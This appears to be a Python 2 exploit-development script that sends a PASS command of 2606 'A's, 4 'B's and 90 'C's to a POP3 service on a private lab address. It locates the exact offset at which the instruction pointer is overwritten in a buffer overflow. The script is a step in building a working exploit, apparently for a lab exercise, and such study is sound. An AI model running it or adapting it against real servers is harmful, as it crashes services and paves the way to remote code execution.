#!/usr/bin/env python
"""
🎯 Precision Fuzzer
Checking exact byte offsets before the crash. 📏
This helps confirm exactly where the EIP (Instruction Pointer) is overwritten.
"""

import socket

def test_precise_offset():
    # 🎯 Target Info
    target_ip = '192.168.250.136'
    target_port = 110 # POP3
    
    # 📏 Offset Analysis
    # We send 2606 'A's, then 4 'B's.
    # If EIP becomes 42424242 (BBBB), we hit the bullseye! 🎯
    offset_a = 2606
    bytes_b = 4
    bytes_c = 90
    
    payload = ("A" * offset_a) + ("B" * bytes_b) + ("C" * bytes_c)
    
    print "\n🎯 Precision Offset Test"
    print "   🎯 Target: " + target_ip + ":" + str(target_port)
    print "   📏 Sends: [A x " + str(offset_a) + "] + [B x 4] + [C x " + str(bytes_c) + "]"
    print "   🕵️  Look for EIP = 42424242 in your debugger!"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        print "   👋 Connected!"
        s.recv(1024) # Banner
        
        print "   👤 Sending USER..."
        s.send('USER root\r\n')
        s.recv(1024)
        
        print "   🔑 Sending Malicious PASS..."
        s.send('PASS ' + payload + '\r\n')
        
        response = s.recv(1024)
        print "   📩 Response: " + response.strip()
        
        s.close()
        print "   ✅ Payload Sent."
        
    except Exception as e:
        print "   ❌ Error: " + str(e)

if __name__ == "__main__":
    test_precise_offset()
